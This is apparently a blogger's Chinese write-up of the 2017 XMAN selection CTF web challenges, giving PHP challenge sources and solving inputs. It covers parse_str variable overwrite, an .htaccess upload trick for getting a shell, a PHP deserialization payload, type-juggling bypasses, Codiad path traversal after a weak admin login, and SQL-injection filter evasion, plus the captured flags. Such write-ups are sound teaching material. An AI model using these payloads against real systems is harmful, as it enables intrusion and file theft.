---
title: 2017 XMAN选拔赛WEB部分 WriteUp
tags:
  - CTF
  - WriteUp
  - php
  - SQL注入
  - 上传
  - 反序列化
  - 文件包含
  - 盲注
date: 2017-07-26 11:10:35
---

## variacover
<!-- more -->
```php
<meta charset="utf-8">
<?php
error_reporting(0);
if (empty($_GET['b'])) {
    show_source(__FILE__);
    die();
}else{
    include('flag.php');
$a = "www.XMAN.com";
$b = $_GET['b'];
@parse_str($b);
if ($a[0] != 'QNKCDZO' && md5($a[0]) == md5('QNKCDZO')) {
    echo $flag;
}else{
exit('你的答案不对0.0');
}
}
?>
```
题目直接给了源代码，前几天刚做过的parse_str 变量覆盖漏洞，parse_str会将传入的字符串解析成php变量，这里构造get请求`?b=a[0]=mCDemCDe`，即可拿到flag
`XMAN{A_sTr_covcderd_t3st_you_oW?}`

## urldecode
看题目提示了url编码，hackbar里点了两次urlencode就getflag了
```
http://challenges.xctf.org.cn:7772/?me=%25%35%38%25%34%64%25%34%31%25%34%65
```
flag:`XMAN{UrlDeCode_CooL_yOu_u0D3rSta9D!}`

## upload
这道题是赛后做出来的，前面各种上传都没有成功，后来听人说是`.htaccess上传`，于是学习了一波，上传一个构造过的`.htaccess`文件，就可以指定后缀为`xxxx`的文件解析成php，再上传一个`xxxx后缀`的文件即可getshell，然后菜刀连接拿下flag,`.htaccess`文件如下:

```html
<FilesMatch "xiha">
SetHandler application/x-httpd一php
</FilesMatch>
```

##  unserialize
跟着题目提示 `?code=1 -->flag.php--> help.php`
```php
class FileClass{
    public $filename = 'error.log';

    public function __toString(){
        return file_get_contents($this->filename);
    }
}
```
经典的php反序列化，构造
```
?code=O:9:"FileClass":1:{s:8:"filename";s:8:"flag.php";}
```

即可读取`flag.php`文件,flag:`XMAN{UUNser1AL1Z3_XMAN__0)(0}`

## PHP
`index.php~` 有`index.php`的源代码，

考察的是php几个弱类型还有函数的绕过漏洞，ISCC2017中做过类似的题，所以手快一血了
```php
<?php
$a=0;
$b=0;
$c=0;
if (isset($_GET['aaa']))
{
        $aaa = $_GET['aaa'];
        $aaa=="1"?die("Emmm..."):NULL;
        switch ($aaa)
        {
        case 0:
        case 1:
                $a=1;
                break;
        }
}
$bbb=(array)json_decode(@$_GET['bbb']);
if(is_array($bbb)){
    is_numeric(@$bbb["ccc"])?die("Emmm..."):NULL;
    if(@$bbb["ccc"]){
        ($bbb["ccc"]>2017)?$b=1:NULL;
    }
    if(is_array(@$bbb["ddd"])){
        if(count($bbb["ddd"])!==2 OR !is_array($bbb["ddd"][0])) die("Emmm...");
        $eee = array_search("XMAN", $bbb["ddd"]);
        $eee===false?die("Emmm..."):NULL;
        foreach($bbb["ddd"] as $key=>$val){
            $val==="XMAN"?die("Emmm..."):NULL;
        }
        $c=1;
}
}
if($a && $b && $c){
    include "flag.php";
    echo $flag;
}
?>
```
要让a,b,c三个变量等1才能拿到flag
于是构造`?aaa=0&bbb={"ccc":"2018a","ddd":[[],0]}`
总解一下几个绕过的点：
- `($bbb["ccc"]>2017)`:当`$bbb["ccc"]`为`"2018a"`时会变成`2018`，即可绕过
- `$eee = array_search("XMAN", $bbb["ddd"]);`因为 array_search    函数没有加第三个参数true，所以是弱类型的比较,`XMAN`会变成0,于是构造`"ddd":[[],0]` ,就变成`array_search(0, [[],0]);`返回true

##  download

Codiad的本地文件包含漏洞，比赛的时候一直没包含成功，后来发现是我没登录

弱口令 `admin` `admin`，登陆之后访问
```
http://challenges.xctf.org.cn:7775/components/filemanager/download.php?path=../../../../var/www/flag.txt&amp;amp;type=undefined
```
就能拿到flag，一航大佬挖到了0day还申请了CVE，膜一下

## CTF用户登录

一道坑题，盲注，空格过滤了用`%0a`代替，逗号过滤了用`from for`代替
最后的flag是`ctf_users`中flag用户的密码解`base64`
`XMAN{DO_you_l1ke_sqlmap_sqlmap}`
到很后面才放的hint `flag在ctf_users表里`，我在ctf_flags表里盲注了半天，网速还慢，就很难受。

## Welcome2IRC

irc连接就有flag了，签到题